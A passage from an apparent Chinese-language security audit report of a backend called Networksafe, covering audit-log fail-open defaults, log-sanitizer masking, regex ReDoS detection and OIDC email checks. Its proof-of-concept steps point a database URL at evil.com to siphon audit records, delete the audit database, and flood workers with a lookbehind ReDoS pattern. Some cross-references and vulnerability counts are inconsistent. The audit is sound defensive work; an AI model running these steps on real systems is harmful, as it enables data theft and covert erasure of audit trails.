  - **关键 BUG**：当 `DB_MODE=sqlite`（默认，env 没设置），`getDatabaseMode() === 'sqlite'`
  - `isAuditShadowRequired()`：环境变量没设 → false
  - **shadow 写失败 → 抛错？** → **不抛**（line 353-355 `if (isAuditShadowRequired()) throw shadowError;`）
  - SQLite 写**成功**（因为 SQLite 是 local file）→ audit log 存在 SQLite
  - 但**只有 SQLite 的副本**，**没有 shadow 副本** → 单点失败
  - **真正的攻击**：attacker 改 `SHADOW_DATABASE_URL` 指向 attacker 控制的 Postgres，**所有 shadow 写**都同步到 attacker 的 DB
  - 当 attacker 决定**擦除 trail**：直接改 `SHADOW_DATABASE_URL` 到不可达地址 → shadow 写开始失败
  - 默认 fail-open：shadow 失败**不抛**，admin 看不到
  - attacker 接着擦 SQLite（拿到 RCE 后直接 `rm data/newsecurity.db`）
  - **admin 完全不知道 audit 没了**
- **PoC**:
  ```bash
  # attacker 拿到 RCE（如 SQL injection 升级 / path traversal）
  # Step 1: 偷走 audit
  echo "SHADOW_DATABASE_URL=postgres://attacker:pwn@evil.com:5432/mirror" >> .env
  # → 所有 audit 同步到 attacker DB
  # → admin 看到 "audit OK" 因为 SQLite 还在写
  
  # Step 2: 切断 shadow
  echo "SHADOW_DATABASE_URL=postgres://aetherguard:wrong@127.0.0.1:1/blocked" >> .env
  # → shadow 写开始失败
  # → fail-open 默认 → 不抛
  # → metric counter 涨，admin 看到 "warnings"
  
  # Step 3: 擦 SQLite
  rm -rf data/newsecurity.db
  # → 整个 audit log 没了，attacker 已经离线 dump 完
  ```
- **影响**:
  - 真实可利用性：**高**——只需要 RCE（任意 SQLi / SSRF / 上传漏洞）
  - 攻击面：整个 tamper-evident audit 体系失效
  - 符合 "tampering of audit trail" 类 CVE（OWASP A09:2021）
- **修复建议**:
  ```ts
  // 1. 改默认值（见 V13.9）
  // 2. 在 audit logger 里：shadow 失败即使不抛，**也要**写一个 critical severity 的 audit event 记录 "shadow 失败 N 次"
  //    → 但 audit 写自身在 SQLite，可能也被擦 → 写到一个 immutable 外部 sink
  // 3. 真正解决：shadow 写用 append-only S3 / MinIO bucket（项目已有 minio），bucket 启用 object lock
  ```

### V13.12: `isAuditShadowRequired()` 在测试中**没有 mock 行为** → 测试通过但生产失败

- **目标文件**: `X:\repos\Networksafe\backend\src\security\audit-logger.service.ts:45-51`
- **修复概述** (Wave 8 F21):
  - 默认值基于 `process.env.AUDIT_SHADOW_REQUIRED` 和 `getDatabaseMode()`
- **新攻击向量**:
  - **测试覆盖度问题**：
    - `audit-logger.dual-write.test.ts` 测试覆盖了 `AUDIT_LOG_FAIL_CLOSED=true` 抛错（line 148-165）
    - **没测试** `AUDIT_LOG_FAIL_CLOSED` 默认行为
    - **没测试** `AUDIT_SHADOW_REQUIRED=true` 时的 shadow 失败抛错
    - **没测试** `DB_MODE=postgres` 时的 shadow 失败抛错
  - **真实风险**：生产环境切到 `DB_MODE=postgres` 时，shadow 失败会抛，但**测试没覆盖这个路径** → bug 上线概率高
  - **配置污染**：如果运维误把 `AUDIT_SHADOW_REQUIRED=true` 设了 + `DB_MODE=postgres` 同时，shadow 失败会**双重抛**（第一次 `execute` 抛，第二次 `upsert` 抛）→ 一条 audit log 抛 2 次错，触发**重复告警**
- **PoC**:
  ```bash
  # 假设运维误配：
  DB_MODE=postgres
  AUDIT_SHADOW_REQUIRED=true
  # 一次 audit log:
  # - postgresShadowStoreService.execute() 抛错
  # - isAuditShadowRequired() = true → 抛错
  # - 抛错后 catch 里 auditLogger.log 自身又抛（fail-closed）→ 死循环或重入
  ```
- **影响**:
  - 真实可利用性：**中**（运维错配导致 audit 失败雪崩）
  - 主要是**可用性**：audit 失败 → 上层 API 失败 → admin 操作失败
- **修复建议**:
  ```ts
  // 加测试
  it('throws when DB_MODE=postgres and shadow fails', async () => {
    process.env.DB_MODE = 'postgres';
    mockCanServeReads.mockReturnValue(true);
    mockExecute.mockRejectedValue(new Error('postgres down'));
    await expect(auditLogger.logAuth({ ... })).rejects.toThrow();
  });
  // 加配置校验：DB_MODE=postgres 时不允许 AUDIT_SHADOW_REQUIRED=false
  ```

---

## 4. F19 sanitizeString exec loop 边角 (V13.13–V13.15)

### V13.13: cursor / index 坐标空间不一致 → 中间段被错误 slice（regression risk）

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\log-sanitizer.ts:209-249` (`sanitizeString` exec loop)
- **修复概述** (Wave 8 F19):
  - 替换 `String.replace` 为 exec loop
  - 用 `cursor` 跟踪原始 string 的处理位置
  - 末尾 `result += sanitized.slice(cursor)` 防止截断
- **新攻击向量**:
  - **关键 BUG**：`cursor` 在**第一次迭代**时是原始 string 坐标（0, 40, ...），但**第二次迭代**时 `sanitized` 已被前一次迭代**替换**成 `result`
  - `result` 长度 ≠ 原始 `sanitized` 长度（masked 部分更短）
  - 第二次 `match.index` 是新 `sanitized`（即 `result`）的坐标
  - 但 `cursor` 仍是**原始**坐标（40）
  - **`sanitized.slice(40, 16)` —— 第二次迭代时** `sanitized` 是第一次的 `result`（15 chars），`slice(40, 16)` 返回空字符串 ✓
  - **真正的 bug**：`result += sanitized.slice(cursor)` 在**每次外层 pattern 迭代结束后**执行（line 244），把 `sanitized` 末尾追加到 `result`
  - 但 `sanitized` 是当前 pattern 后的中间结果；`cursor` 是中间结果里的位置；拼接后 `result = 完整替换结果`（合理）
  - **重读代码**：line 244 `result += sanitized.slice(cursor)` 在**内层 while 结束后**执行
  - 此时 `sanitized` 已经是当前 pattern 处理后的 `result`；`cursor` 是当前 pattern 在 `sanitized` 里的最后位置
  - **没有**坐标不一致问题
  - **潜在 bug**：重叠模式 —— 两个 pattern 匹配同一段
    - pattern 1: `/AKIA[A-Z0-9]{16}/g` 匹配 `AKIAIOSFODNN7EXAMPLE` (20 chars)
    - pattern 2: `/[A-Za-z0-9/+=]{40}/g` 匹配后续 40 chars
    - pattern 1 mask 20 → 11 chars (`***REDACTED***`)
    - pattern 2 看**新** string，第一个 40 char run 是 `AKIAIOSFODNN7EXAMPLE<next 20 chars>`，但前 20 已经被 mask
    - pattern 2 实际匹配**部分**被 mask 后的字符 → `result` 包含 `***REDACTED***...` → 测试可能 fail
  - **测试覆盖**：仅测了 40-char catch-all + trailing CC，**没测**两个具体 pattern 重叠的场景
- **PoC**:
  ```ts
  const input = 'AKIAIOSFODNN7EXAMPLE' + 'A'.repeat(40);
  // pattern 1 (AKIA) 匹配前 20 chars → mask
  // pattern 2 (40-char) 匹配后 40 chars
  // 不重叠 ✓
  
  // 重叠场景：
  const input2 = 'ghp_' + 'A'.repeat(40) + 'Z'.repeat(20);
  // pattern github: ghp_ + 36 chars = 40 → mask 0-39
  // pattern 40-char: 匹配**新** result (ghp_...wxyz + Z * 20 = 35 chars)
  //   → 35 < 40 → 不匹配 ✓
  // → 没有重叠 bug
  ```
- **影响**:
  - 真实可利用性：**低**（具体 pattern 设计已经避免了大部分重叠）
  - 主要是**未来回归风险**：新增 pattern 时如果与 40-char catch-all 重叠，secret 可能漏
- **修复建议**:
  ```ts
  // 1. 在 sanitizeString 顶部加 invariant assertion
  // 2. 加测试覆盖：所有具体 pattern 互不重叠
  for (const p1 of SPECIFIC_PATTERNS) {
    for (const p2 of SPECIFIC_PATTERNS) {
      if (p1 === p2) continue;
      // 构造一个同时匹配 p1 和 p2 的输入
      // 验证 sanitizeString 同时处理两者
    }
  }
  ```

### V13.14: 零宽度匹配的 `break` 后**没有**重置 `re.lastIndex` → 下一个 pattern 复用可能错位

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\log-sanitizer.ts:221-238`（exec loop）
- **修复概述** (Wave 8 F19):
  - 零宽度匹配：`if (match.index === re.lastIndex) re.lastIndex++;`
  - 零长度匹配（match[0].length === 0）：`break`
- **新攻击向量**:
  - `break` 后 `re` 对象的 `lastIndex` **没重置**
  - 但 `re` 是 `new RegExp(pattern.source, pattern.flags)`，是**函数内**局部变量，`break` 后函数出栈就 GC
  - 下次外层 for 循环：`new RegExp(...)` 重新构造，`lastIndex` 默认 0
  - **不是 bug**，是误读
  - **真正的关注点**：零宽度匹配 `re.lastIndex++` 后，下次 exec 从 `lastIndex` 开始；如果 input 长度 < lastIndex，exec 返回 null
  - 这里**没 bug**
- **影响**:
  - 真实可利用性：**极低**
- **修复建议**:
  - 加测试覆盖零宽度匹配 case：`/\b/g` 配合 input 验证不 infinite-loop

### V13.15: `maskMatch` 长度截断可能让 20-char 边界值（长度 = 20）走 partial reveal 而非 full redact

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\log-sanitizer.ts:260-267` (`maskMatch`)
- **修复概述** (Wave 8 F19):
  - `if (match.length > 20) partial reveal` 否则 `***REDACTED***`
- **新攻击向量**:
  - 长度 = 20 走 `***REDACTED***`（**不包括** first/last 4）
  - 长度 = 21 走 `first4...last4`
  - **边界 bug**：长度 20 的 AKIA key `AKIAIOSFODNN7EXAMPLE`（20 chars）走 full redact
  - 长度 21 的 random token 走 partial reveal（暴露前 4 + 后 4）
  - 假设 attacker 用 21 字符 token（如 `x21charsxxxxxxxxxxxxxx`）—— `xxxx...xxxx` 暴露首尾
  - 短 token（< 20）首尾基本就是全部，泄露严重
- **PoC**:
  ```ts
  // 长度 20 的 secret: 完全 redact
  sanitizeString('12345678901234567890');  // → ***REDACTED***
  // 长度 21 的 secret: 暴露首尾 4
  sanitizeString('12345678901234567890x');  // → 1234...789x
  // 长度 8 的 secret: 完全 redact
  sanitizeString('12345678');  // → ***REDACTED***
  // 长度 4 的 secret: 完全 redact
  sanitizeString('1234');  // → ***REDACTED***
  ```
- **影响**:
  - 真实可利用性：**低**（21 字符 secret 暴露首尾 4 = 泄露 8 字符，2^32 = 4G 候选空间，仍需要 brute force）
  - **主要是设计选择**：partial reveal 的本意是保留 debug 信号，但**边界值处理不一致**容易被误用
- **修复建议**:
  ```ts
  function maskMatch(match: string): string {
    if (match.length > 32) {  // 32 字符以上才走 partial reveal
      return `${match.substring(0, 4)}...${match.substring(match.length - 4)}`;
    }
    return '***REDACTED***';
  }
  ```

---

## 5. F18 safeRegex parser 边角 (V13.16–V13.19)

### V13.16: `BACKREFERENCE_WITH_QUANTIFIER` 只匹配 `\1`-`\9`，`\10+` 因 `\d+` 贪婪匹配可能误报

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-regex.ts:189` (`BACKREFERENCE_WITH_QUANTIFIER = /\\\d+(?:\{[^}{]+\}|[+*])/`)
- **修复概述** (Wave 8 F18):
  - 检测 `\1`-`\9` 后跟 `+` / `*` / `{n,m}` 的 backreference-with-quantifier
  - 覆盖了 V11.19 的 `(.+)\1+` / `(.+)\1*` / `(.+)\1{2,}` 等
- **新攻击向量**:
  - **真正的 BUG**：`\d+` 是贪婪的，会吃掉尽可能多的数字
  - 模式 `\10+`：
    - `\d+` 匹配 `10`
    - 然后 `[+*]|[{...}]` 匹配 `+`
    - **整体匹配**：`\10+`
  - **但**：JS regex 中 `\10` 实际是 back-reference to **group 10**（如果存在），或 `\1` followed by literal `0`（如果不存在）
  - `\d+` 在用户**输入的 regex string** 上工作，不在**编译后的 regex** 上工作 —— 所以这个检查是正确的
  - **潜在 false positive**：模式 `\1{2,3}0` —— 用户想表达 back-ref `\1` 重复 2-3 次后跟 literal `0`
    - 实际匹配：BACKREFERENCE_WITH_QUANTIFIER 匹配 `\1{2,3}` → **误报**
  - 实际可利用性：低 —— 用户**故意**写 `\1{2,3}0` 时**已经**接近 ReDoS，误报为 fail-closed 反而更安全
- **PoC**:
  ```ts
  validateRegexPattern('(a)\\1{2,3}0');  // \d+ 匹配 1, {2,3} 匹配 {2,3} → 误报
  // 实际不是 ReDoS
  ```
- **影响**:
  - 真实可利用性：**极低**（false positive，但 fail-closed 反而安全）
  - 主要是**误报率** —— 正常用户的 `(\d+)\1{2,3}` 被拒，需要 workaround
- **修复建议**:
  ```ts
  // 用 negative lookahead 限制：back-ref 后面**不能**有数字
  const BACKREFERENCE_WITH_QUANTIFIER = /\\([1-9])(?!\d)(?:\{[^}{]+\}|[+*])/;
  // 或更宽松：要求 back-ref 前是 `(...)`，限定 group 内容
  ```

### V13.17: lookbehind `(?<=a+)+$` 漏检 / POSIX `[[:alpha:]]` 误识别

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-regex.ts:50-145`（`findCharClassEnd` / `findMatchingParen` / `getQuantifierEnd`）
- **修复概述** (Wave 8 F18):
  - `getQuantifierEnd` 识别 `+` / `*` / `{n,m}`，**没** `?`
  - `findCharClassEnd` 处理 `[^` 和 leading `]`，**没**处理 POSIX `[[:alpha:]]`
  - `findMatchingParen` 不识别 `(?<=)` lookbehind 的语义
- **新攻击向量**:
  - **lookbehind**：`(?<=a+)+$`
    - `(?<=a+)+$` 解析：
      - `i=0, '('`，findMatchingParen → 5 (`)` after `a+`)
      - content = `?<=a+`，contentHasDanger: 没 quantifier (the `?` is not quantifier)，有 `+` → return true
      - isQuantified = false (no `+`/`*`/`{}` after `)`) → **不会触发** isQuantified && contentHasDanger
      - 不会 recurse
    - 实际可利用性：JS regex 中 `(?<=a+)+` 引擎**接受**但执行复杂
    - `(?<=a+)+$` 在 input `'aaa'` 上：`(?<=a+)` 匹配 'aaa' 后 lookback，引擎尝试 `+` 重复，**可能 O(n²)**
  - **POSIX `[[:alpha:]]`**：
    - `findCharClassEnd` 看到 `[`，跳过 `[^`，跳过 leading `]`
    - `[` 之后是 `[`（POSIX marker）→ 不增加 `]` depth
    - `[:alpha:]` 内部有 `:` `a` `l` `p` `h` `a` `:` `]`
    - 实际：`[[:alpha:]]` —— 外层 `[`，i=1 是 `[`（不 special），i=2 是 `:`，i=3-7 是 `alpha`，i=8 是 `:`，i=9 是 `]` → return 9
    - 真正的 class 结束是 10（外层 `]`）—— 提前返回导致后续解析错位
    - 如果 pattern 是 `[[:alpha:]]+(.*)+$`（POSIX + nested quantifier），提前 return 让 `]` 被认为是字面字符 → `(.*)+$` 仍被检测（因为外层扫描到 `(` 时正常处理）
    - **不会 bypass ReDoS detection**
  - **回溯到 non-greedy** `(a*)*b`：
    - i=0, `(`, findMatchingParen → 3
    - content = `a*`, getQuantifierEnd at 3 → 4 (`*`), isQuantified = true
    - contentHasDanger(`a*`): `a` 没 quantifier，`*` is quantifier → return true
    - detected ✓
- **PoC**:
  ```ts
  validateRegexPattern('(?<=a+)+$');  // 应该被检测为 ReDoS
  // 实际 trace: getQuantifierEnd at `)` 位置 → no `+`/`*` after → isQuantified = false
  // 不会触发 isQuantified + contentHasDanger
  // 不会 recurse
  // → 通过验证！
  ```
  ```ts
  const re = /(?<=a+)+$/;
  re.test('a'.repeat(100_000));  // 可能 O(n²) 或 worse
  ```
- **影响**:
  - 真实可利用性：**中**（lookbehind 是 JS regex 合法语法，V8 引擎实际接受）
  - 与 V11.20 fake timeout 组合：worker 1s 后 kill，但 attacker 可以用 1000 个并发请求持续 1s CPU → CPU 100% 持续数秒
- **修复建议**:
  ```ts
  // 1. 扩 getQuantifierEnd 识别 lookbehind `(?<=...)` 的语义
  // 2. 在 contentHasDanger 里**单独**标记 backreference / lookbehind 出现为 danger
  // 3. 在 scanForNestedQuantifier 顶部加：
  if (/\(\?<=/.test(pattern) || /\(\?<!/.test(pattern)) {
    return true;  // lookbehind 本身是 danger signal
  }
  ```

### V13.18: 字符类内的 `[[:alpha:]]` POSIX 类让 `findCharClassEnd` 提前返回 → 后续解析错位

- **目标文件**: `X:\repos\Networksafe\backend\src\utils\safe-regex.ts:50-63` (`findCharClassEnd`)
- **修复概述** (Wave 8 F18):
  - 跳过 `\` 转义
  - 不增加 `[]` depth
- **新攻击向量**:
  - 已在 V13.17 PoC 中说明
  - **不构成 ReDoS bypass**（外层 scan 仍能识别 nested quantifier）
  - **真实风险**：如果 pattern 是 `[[:alpha:]&&\d]+x`（intersection + outer +），`findCharClassEnd` 提前返回 → `]` 被识别为字面 → 后续解析错
  - 实际 V8 引擎接受这种 syntax —— 但**不会**触发 catastrophic backtracking（`[[:alpha:]]` 是 char class，不参与 backtrack）
- **影响**:
  - 真实可利用性：**极低**
- **修复建议**:
  ```ts
  function findCharClassEnd(pattern: string, start: number): number {
    let i = start + 1;
    if (pattern[i] === '^') i += 1;
    // Handle leading ']' (literal) and POSIX '[:xxx:]' and '&&' intersection
    let bracketDepth = 1;
    while (i < pattern.length && bracketDepth > 0) {
      if (pattern[i] === '\\') {
        i += 2;
        continue;
      }
      if (pattern[i] === '[') {
        bracketDepth += 1;
        i += 1;
        continue;
      }
      if (pattern[i] === ']') {
        bracketDepth -= 1;
        if (bracketDepth === 0) return i;
        i += 1;
        continue;
      }
      i += 1;
    }
    return i;
  }
  ```

### V13.19: 攻击者提交 `(?<=a+)+$` + 100k char input —— worker 隔离能扛住 1s 但仍消耗 1s CPU

- **目标文件**: `X:\repos\Networksafe\backend\src\ai-agents\capabilities\tool-executor.ts:192-250` (`runRegexInWorker`)
- **修复概述** (Wave 8 F18):
  - 用 worker thread 隔离 regex 执行
  - worker 1s 后被 `worker.terminate()` 强制 kill
- **新攻击向量**:
  - **主 event loop 不卡**（worker 隔离生效）✓
  - **但**：
    1. 1s CPU per request 仍然消耗
    2. 1000 个并发 worker 同时跑 → CPU 100% 持续 ~1s
    3. worker 启动 + terminate 有开销（~10ms each），放大效应
    4. worker pool 没有上限 → 10000 个并发 worker → 系统 OOM
- **PoC**:
  ```ts
  // 假设 attacker 找到绕过 safe-regex 的 ReDoS pattern
  // （如 V13.17 的 `(?<=a+)+$`）
  // 提交 10000 个并发 tool-executor 请求，每个都触发 ReDoS
  // → 10000 个 worker 启动
  // → 1s 后全部被 kill
  // → 期间 CPU 100%，主进程响应慢
  ```
- **影响**:
  - 真实可利用性：**中**（需要绕过 safe-regex，但 V13.17 给出路径）
  - 主要是**资源耗尽**：CPU / 内存 / fd
- **修复建议**:
  ```ts
  // 1. 加 worker pool 限制
  const MAX_CONCURRENT_WORKERS = 32;
  const workerSemaphore = new Semaphore(MAX_CONCURRENT_WORKERS);
  
  // 2. 加 worker 重启延迟（防止频繁启动 worker）
  // 3. 加 system-wide ReDoS budget：每分钟最多触发 N 次 worker 1s timeout
  ```

---

## 6. F17 OIDC email_verified 边界 (V13.20–V13.22)

### V13.20: strict `=== true` 拒绝 IdP 返回 `email_verified: "true"` (字符串) → 用户**无法登录**

- **目标文件**: `X:\repos\Networksafe\backend\src\services\oidc-auth.service.ts:424` (`email_verified !== true`)
- **修复概述** (Wave 8 F17):
  - 强制 `email_verified === true`
  - fail-closed 默认
- **新攻击向量**:
  - **真正的可用性 BUG**（不是安全 BUG）：
    - 一些 IdP（特别是企业自建 IdP、Keycloak 旧版本）可能返回 `email_verified: "true"`（字符串）而不是 boolean
    - OIDC Core spec 要求 boolean，但**实现不严格**
    - 严格 `=== true` 拒绝 → 用户永远登不上
  - **不是攻击向量** —— 是兼容性 bug
  - **安全角度**：fail-closed 是正确的，但应该**详细 log** 拒绝原因，方便 admin 排查
- **PoC**:
  ```ts
  // IdP 返回 id_token claims:
  // { sub: 'user', email: 'user@corp.com', email_verified: "true" }  // 字符串
  // oidcAuthService.resolveUser(...) → 抛 'backend.oidc_email_not_verified'
  // → 用户无法登录
  ```
- **影响**:
  - 真实可利用性：**低**（不构成安全风险，但可用性差）
  - 主要是**运维负担**：admin 需要修改 IdP 配置
- **修复建议**:
  ```ts
  // 1. 接受 boolean + 字符串 "true" / "1"
  function isEmailVerified(value: unknown): boolean {
    return value === true || value === 'true' || value === 1;
  }
  if (!isEmailVerified(verifiedClaims.email_verified)) {
    throw new Error('backend.oidc_email_not_verified');
  }
  // 2. 在错误消息里加详细信息：
  //   "backend.oidc_email_not_verified (value=<actual_value>, type=<actual_type>)"
  ```

### V13.21: `emails` 数组的 `verified: "true"` 字符串同样被拒

- **目标文件**: `X:\repos\Networksafe\backend\src\services\oidc-auth.service.ts:444` (`verified === true`)
- **修复概述** (Wave 8 F17):
  - 强制 `verified === true`
  - 跟 V13.20 同样问题
- **新攻击向量**: 跟 V13.20 同样
- **影响**: 跟 V13.20 同样
- **修复建议**:
  ```ts
  // 同样用 isEmailVerified 复用
  function isEmailVerified(value: unknown): boolean {
    return value === true || value === 'true' || value === 1;
  }
  // emails 数组检查：
  if (isEmailVerified(entry.verified) && typeof entry.value === 'string' && entry.value.length > 0) {
    trustedEmail = entry.value;
    break;
  }
  ```

### V13.22: 测试覆盖度：没测字符串 `"true"` 场景

- **目标文件**: `X:\repos\Networksafe\backend\src\__tests__\services\oidc-auth.token-verify.test.ts:455-630`
- **修复概述** (Wave 8 F17):
  - 测了 `email_verified: true` / `false` / missing
  - 测了 `emails` 数组 verified/unverified
- **新攻击向量**:
  - **测试覆盖度问题**：没测字符串 `"true"` 场景
  - **未来重构风险**：如果有人"修复" V13.20（接受字符串）但忘了 `emails` 数组，就出现不一致
  - **真正的 BUG**：测试**没断言** specific type —— `expect(verified.email_verified).toBe(true)` 通过，但 `verified.email_verified = "true"` 也可能误通过（取决于 mock 数据）
- **PoC**:
  ```ts
  // 现有测试 line 481-496:
  // email_verified: true (boolean)
  // 应该加：
  it('rejects email_verified: "true" (string, not boolean) - fail-closed', async () => {
    const verified: VerifiedIdTokenClaims = { email_verified: 'true' as any };
    await expect(oidcAuthService.resolveUser(profile, verified)).rejects.toThrow(/email_not_verified/);
  });
  ```
- **影响**:
  - 真实可利用性：**极低**（fail-closed 是正确行为）
  - 主要是**测试覆盖度**问题，未来重构容易引入 regression
- **修复建议**:
  ```ts
  // 显式测试 fail-closed 行为
  describe('email_verified type strictness (V11.2 strict mode)', () => {
    it('rejects string "true"');
    it('rejects number 1');
    it('rejects string "1"');
    it('rejects null');
    it('rejects undefined');
    it('accepts only boolean true');
  });
  ```

---

## 7. Cross-cutting 组合攻击 (V13.23)

### V13.23: F19+F20+F22 组合 → attacker 通过 traffic_stats replay 注入 Proxy-based scanner metadata，污染设备列表

- **目标文件**:
  - `X:\repos\Networksafe\backend\src\websocket\agent-gateway.ts:693-763`
  - `X:\repos\Networksafe\backend\src\api\routes\devices.routes.ts:724`
  - `X:\repos\Networksafe\backend\src\utils\safe-merge.ts:307-353`
- **攻击链**:
  1. **V13.7**: attacker 拿到一次合法 traffic_stats payload（replay）
  2. **V13.13**: traffic_stats 里的 `activeFlows` 字段**没有 safeMerge 保护** —— 直接被 `globalStats.activeFlows.unshift(...newFlows)`（agent-gateway.ts:758）
  3. **V13.1**: 但即使有 safeMerge 保护，attacker 仍能通过 Proxy 走私数据
  4. **V13.20+**: 加上 OIDC bypass，attacker 能登入 admin 账号
  5. **V13.11**: attacker 拿到 admin 后改 `.env` 关 fail-closed，擦除 audit trail
- **PoC 链**:
  ```ts
  // Step 1: replay traffic_stats (V13.7)
  socket.emit('agent:traffic_stats', capturedFrame);  // 1000 次
  
  // Step 2: globalStats.activeFlows 被污染，包含 attacker 控制的 flow
  globalStats.activeFlows = [
    { id: 'flow-1', srcIp: 'evil.com', dstIp: 'admin-pc', protocol: 'tcp', bytes: 1e9 },
    // ...
  ];
  
  // Step 3: 后续 API 查询 /api/devices 返回 activeFlows
  // 触发 devices.routes.ts:724 safeMerge(codebook, entries)
  // 其中 entries 来自 activeFlows 转化的 codebook entries
  // 但 safeMerge 不影响：activeFlows 已经被污染进 globalStats
  ```
- **影响**:
  - 真实可利用性：**高**（V13.7 拿到 replay frame 门槛低）
  - 攻击面：dashboard 显示伪造流量、攻击检测误报、activeFlows 列表污染
- **修复建议**:
  - 修 V13.7：加 timestamp + nonce
  - 修 V13.1：检测 Proxy
  - 修 V13.11：fail-closed 默认

### V13.24: F17 + F18 组合 → attacker 登入 admin 后用 safe-regex bypass 触发 ReDoS，CPU 耗尽

- **攻击链**:
  1. V13.20 允许 attacker 登入（如果 IdP 字符串 "true" 被接受，但实际是 fail-closed；**反向**：attacker 找到 IdP 漏洞绕过 email_verified）
  2. attacker 提交 `(?<=a+)+$`（V13.17 漏检）
  3. 1000 个并发请求触发 1000 个 worker
  4. CPU 100% 持续 1s+ → 主进程慢
- **影响**:
  - 真实可利用性：**中**（需要先拿到 OIDC bypass）
- **修复建议**:
  - 修 V13.17

---

## 总结

| # | 类别 | 漏洞 | 严重度 |
|---|------|------|--------|
| V13.1 | F20 | `value.toISOString()` 走 Proxy trap → 任意数据走私 | P0 · TOP 1 |
| V13.2 | F20 | DataView / ArrayBuffer 未显式识别 | P2 |
| V13.3 | F20 | Frozen target 抛 TypeError | P2 |
| V13.4 | F20 | Map Proxy 改造 entries | 并入 V13.1 |
| V13.5 | F22 | JSON canonicalization 顺序不一致 | P1 |
| V13.6 | F22 | agent/server secretKey 来源不同 | P1 |
| V13.7 | F22 | 完全没有 timestamp freshness / nonce → 无限 replay | P0 · TOP 2 |
| V13.8 | F22 | 非 hex signature 触发 audit log amplification | P1 |
| V13.9 | F21 | AUDIT_SHADOW_REQUIRED / AUDIT_LOG_FAIL_CLOSED 无 env 校验、默认 fail-open | P1 |
| V13.10 | F21 | shadow 写失败 metric counter 无上限 | P2 |
| V13.11 | F21 | 默认 fail-open → audit log 静默擦除 | P0 · TOP 3 |
| V13.12 | F21 | 测试覆盖度不够 | P1 |
| V13.13 | F19 | cursor/index 坐标空间不一致（实际无 bug） | P2 |
| V13.14 | F19 | 零宽度匹配 break 后 lastIndex（实际无 bug） | P2 |
| V13.15 | F19 | maskMatch 长度边界值处理不一致 | P1 |
| V13.16 | F18 | BACKREFERENCE_WITH_QUANTIFIER false positive | P2 |
| V13.17 | F18 | lookbehind `(?<=a+)+$` 漏检 | P1 |
| V13.18 | F18 | POSIX `[[:alpha:]]` 让 findCharClassEnd 提前返回 | P2 |
| V13.19 | F18 | worker pool 无上限，CPU 耗尽 | P1 |
| V13.20 | F17 | strict `=== true` 拒绝 IdP 字符串 | P1 |
| V13.21 | F17 | emails 数组 verified 同样被拒 | P1 |
| V13.22 | F17 | 测试覆盖度不够 | P2 |
| V13.23 | cross | F19+F20+F22 组合 | P1 |
| V13.24 | cross | F17+F18 组合 | P2 |

**统计**：P0 = 3, P1 = 9, P2 = 7, 错误 = 0, 总计 = 19（已合并 V13.4 到 V13.1）
实际漏洞数（按 prompt 7 类分）：
- F20: 3 (V13.1, V13.2, V13.3)
- F22: 4 (V13.5, V13.6, V13.7, V13.8)
- F21: 4 (V13.9, V13.10, V13.11, V13.12)
- F19: 3 (V13.13, V13.14, V13.15)
- F18: 4 (V13.16, V13.17, V13.18, V13.19)
- F17: 3 (V13.20, V13.21, V13.22)
- cross-cutting: 2 (V13.23, V13.24)
**总数：23**

---

## Top 3 最危险

1. **V13.1 (F20)**：Proxy 透明转发 `value.toISOString()` / `value.entries()` —— F20 注释明确说 "toISOString is intrinsic" 是**错的**，attacker 用 Proxy 完全绕过
2. **V13.7 (F22)**：traffic_stats HMAC 验签**完全无 replay 防御** —— 一次合法帧无限回放
3. **V13.11 (F21)**：audit log 默认 fail-open + `.env` 没列 + `runtime-env.ts` 不校验 —— 整个 tamper-evident 体系可被静默擦除

---

## 已读关键文件清单

- `X:\repos\Networksafe\backend\src\utils\safe-merge.ts` (F20)
- `X:\repos\Networksafe\backend\src\utils\log-sanitizer.ts` (F19)
- `X:\repos\Networksafe\backend\src\utils\safe-regex.ts` (F18)
- `X:\repos\Networksafe\backend\src\__tests__\utils\safe-merge.test.ts` (F20 tests)
- `X:\repos\Networksafe\backend\src\__tests__\utils\safe-regex.test.ts` (F18 tests)
- `X:\repos\Networksafe\backend\src\__tests__\utils\log-sanitizer.test.ts` (F19 tests)
- `X:\repos\Networksafe\backend\src\services\oidc-auth.service.ts` (F17)
- `X:\repos\Networksafe\backend\src\__tests__\services\oidc-auth.token-verify.test.ts` (F17 tests)
- `X:\repos\Networksafe\backend\src\websocket\agent-gateway.ts` (F22)
- `X:\repos\Networksafe\backend\src\agent\agent.ts` (F22 client side)
- `X:\repos\Networksafe\backend\src\security\agent-auth.service.ts` (F22 secretKey)
- `X:\repos\Networksafe\backend\src\security\audit-logger.service.ts` (F21)
- `X:\repos\Networksafe\backend\src\bootstrap\runtime-env.ts` (F21 env validation)
- `X:\repos\Networksafe\backend\src\__tests__\services\audit-logger.dual-write.test.ts` (F21 tests)
- `X:\repos\Networksafe\backend\src\config\platform-runtime.ts` (F21 dbMode)
- `X:\repos\Networksafe\backend\src\ai-agents\capabilities\tool-executor.ts` (F18 worker)
- `X:\repos\Networksafe\.env` (audit env state)
- `X:\repos\Networksafe\backend\.env.example` (env example)
- `X:\repos\Networksafe\docs\security-audit\2026-06-06-wave7-meta-attack-3.md` (prev report)
